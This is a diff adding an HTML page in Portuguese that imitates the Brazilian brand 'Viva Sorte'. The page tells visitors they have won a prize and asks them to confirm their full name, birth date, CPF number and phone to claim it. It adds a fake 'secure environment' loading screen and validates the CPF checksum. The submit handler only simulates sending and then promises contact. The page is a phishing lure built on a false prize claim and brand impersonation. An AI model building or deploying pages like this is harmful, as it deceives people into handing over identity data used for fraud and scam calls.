@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Viva Sorte — Parabéns!</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --accent:#0b76ff;
+      --accent-dark:#055ecb;
+      --muted:#6b7280;
+      --card-bg:#ffffff;
+      --shadow:0 4px 16px rgba(0,0,0,.08);
+      --max-width:920px;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:Montserrat,sans-serif;
+      background:#fff;
+      color:#0f1724;
+    }
+
+    header, .checkout-card, footer{display:none}
+
+    header{
+      max-width:var(--max-width);
+      padding:16px 20px;
+      display:flex;
+      justify-content:center;
+      margin:auto;
+    }
+    header img.logo{
+      max-height:48px;
+      height:auto;
+      width:auto;
+    }
+
+    main{max-width:var(--max-width);padding:12px;margin:auto;width:100%}
+
+    /* Tela de carregamento */
+    #loading{
+      position:fixed;inset:0;
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      background:#fff;z-index:9999
+    }
+    .pulse{width:120px;height:120px;animation:pulse 1.8s infinite;max-width:90%}
+    @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+    .subtext{font-family:'Playfair Display',serif;font-size:1rem;color:var(--muted);margin-top:12px;text-align:center;padding:0 10px}
+
+    /* Card */
+    .checkout-card{
+      background:#fff;
+      border-radius:10px;
+      box-shadow:var(--shadow);
+      padding:20px;
+      max-width:500px;
+      width:90%;
+      margin:20px auto
+    }
+    .checkout-card h2{
+      font-size:1.2rem;
+      margin-bottom:14px;
+      color:#0b76ff;
+      text-align:center;
+    }
+    .fields{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    label{display:block;font-weight:600;font-size:.9rem;margin-bottom:6px}
+    input{
+      width:100%;padding:9px 12px;
+      border-radius:6px;border:1px solid #ddd;
+      font-size:.95rem
+    }
+    .full{grid-column:1/-1}
+    .btn{
+      background:var(--accent);color:#fff;
+      border:none;padding:12px;
+      border-radius:8px;font-weight:600;
+      font-size:1rem;cursor:pointer;width:100%;
+      transition:background .2s
+    }
+    .btn:hover{background:var(--accent-dark)}
+
+    /* Rodapé */
+    footer{
+      margin:24px auto;
+      color:var(--muted);
+      font-size:.9rem;
+      width:100%;
+      max-width:var(--max-width);
+      padding:0 12px;
+    }
+    .footer-content{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      flex-wrap:wrap;
+      gap:10px;
+    }
+    .footer-content img{
+      height:36px;
+      max-width:100%;
+      width:auto;
+    }
+
+    /* Modal */
+    .modal-backdrop{
+      position:fixed;inset:0;
+      display:flex;align-items:center;justify-content:center;
+      background:rgba(0,0,0,.5);
+      opacity:0;pointer-events:none;
+      transition:.2s
+    }
+    .modal-backdrop.show{opacity:1;pointer-events:auto}
+    .modal{
+      background:#fff;border-radius:12px;
+      padding:22px;max-width:400px;width:90%;text-align:center
+    }
+    .modal h3{margin:0 0 8px}
+    .modal p{margin:0 0 18px}
+
+    /* Responsivo */
+    @media (max-width:720px){
+      .fields{grid-template-columns:1fr}
+      .pulse{width:90px;height:90px}
+      .checkout-card{padding:16px}
+      .footer-content{flex-direction:column;text-align:center}
+    }
+    @media (max-width:480px){
+      .checkout-card h2{font-size:1rem}
+      input{font-size:.85rem}
+      .btn{font-size:.9rem;padding:10px}
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img class="logo" src="./contato/png/logo.png" alt="Logo Viva Sorte">
+</header>
+
+<main>
+  <section id="loading">
+    <img class="pulse" src="./contato/png/trofeu.png" alt="Troféu">
+    <div class="subtext">Preparando Ambiente Seguro...</div>
+  </section>
+
+  <section class="checkout-card" id="checkoutCard">
+    <h2>
+  Parabéns Você é o Ganhador!!!<br>
+  Para resgatar Confirme seus dados
+</h2>
+
+    <form id="checkoutForm" novalidate>
+      <div class="fields">
+        <div class="field full">
+          <label for="nome">Nome completo</label>
+          <input id="nome" type="text" required>
+        </div>
+        <div class="field">
+          <label for="nasc">Data de nascimento</label>
+          <input id="nasc" type="date" required>
+        </div>
+        <div class="field">
+          <label for="cpf">CPF</label>
+          <input id="cpf" type="text" placeholder="000.000.000-00" required>
+        </div>
+        <div class="field">
+          <label for="tel">Telefone</label>
+          <input id="tel" type="tel" placeholder="11999999999" required>
+        </div>
+        <div class="field full">
+          <button type="submit" class="btn">Enviar</button>
+        </div>
+      </div>
+    </form>
+  </section>
+</main>
+
+<footer id="footer">
+  <div class="footer-content">
+    <span>Ambiente Seguro Viva Sorte</span>
+    <span>Título emitido por:</span>
+    <img src="./contato/png/footer.png" alt="Logo Rodapé">
+  </div>
+</footer>
+
+<div id="modalBackdrop" class="modal-backdrop">
+  <div class="modal">
+    <h3>Parabéns!</h3>
+    <p>Dentro de pouco tempo entraremos em contato para entregar o seu prêmio!</p>
+    <button id="closeModal">Fechar</button>
+  </div>
+</div>
+
+<script>
+  const loading=document.getElementById('loading');
+  const header=document.querySelector('header');
+  const checkoutCard=document.getElementById('checkoutCard');
+  const footer=document.getElementById('footer');
+
+  window.addEventListener('load',()=>{setTimeout(()=>{
+    loading.style.display='none';
+    header.style.display='flex';
+    checkoutCard.style.display='block';
+    footer.style.display='block';
+  },2000);});
+
+  function validarCPF(cpf){
+    cpf=cpf.replace(/[^0-9]+/g,'');
+    if(cpf.length!==11||/^([0-9])\1+$/.test(cpf))return false;
+    let soma=0,resto;
+    for(let i=1;i<=9;i++)soma+=parseInt(cpf.substring(i-1,i))*(11-i);
+    resto=(soma*10)%11;
+    if(resto===10||resto===11)resto=0;
+    if(resto!==parseInt(cpf.substring(9,10)))return false;
+    soma=0;
+    for(let i=1;i<=10;i++)soma+=parseInt(cpf.substring(i-1,i))*(12-i);
+    resto=(soma*10)%11;
+    if(resto===10||resto===11)resto=0;
+    return resto===parseInt(cpf.substring(10,11));
+  }
+
+  const form=document.getElementById('checkoutForm');
+  const modal=document.getElementById('modalBackdrop');
+  const closeBtn=document.getElementById('closeModal');
+
+  function showModal(){modal.classList.add('show');}
+  function hideModal(){modal.classList.remove('show');}
+
+  form.addEventListener('submit',e=>{
+    e.preventDefault();
+    const nome=document.getElementById('nome').value.trim();
+    const nasc=document.getElementById('nasc').value;
+    const cpf=document.getElementById('cpf').value.trim();
+    const tel=document.getElementById('tel').value.replace(/\D/g,'');
+
+    if(!nome||!nasc||!cpf||!tel){alert('Campos inválidos ou faltantes.');return;}
+    if(!validarCPF(cpf)){alert('CPF inválido.');return;}
+    if(tel.length!==11){alert('Telefone deve ter 11 dígitos.');return;}
+
+    const btn=form.querySelector('button');
+    btn.disabled=true;btn.textContent='Enviando...';
+    setTimeout(()=>{btn.disabled=false;btn.textContent='Enviar';showModal();form.reset();},1500);
+  });
+
+  closeBtn.addEventListener('click',hideModal);
+  modal.addEventListener('click',e=>{if(e.target===modal)hideModal();});
+</script>
+</body>
+</html>
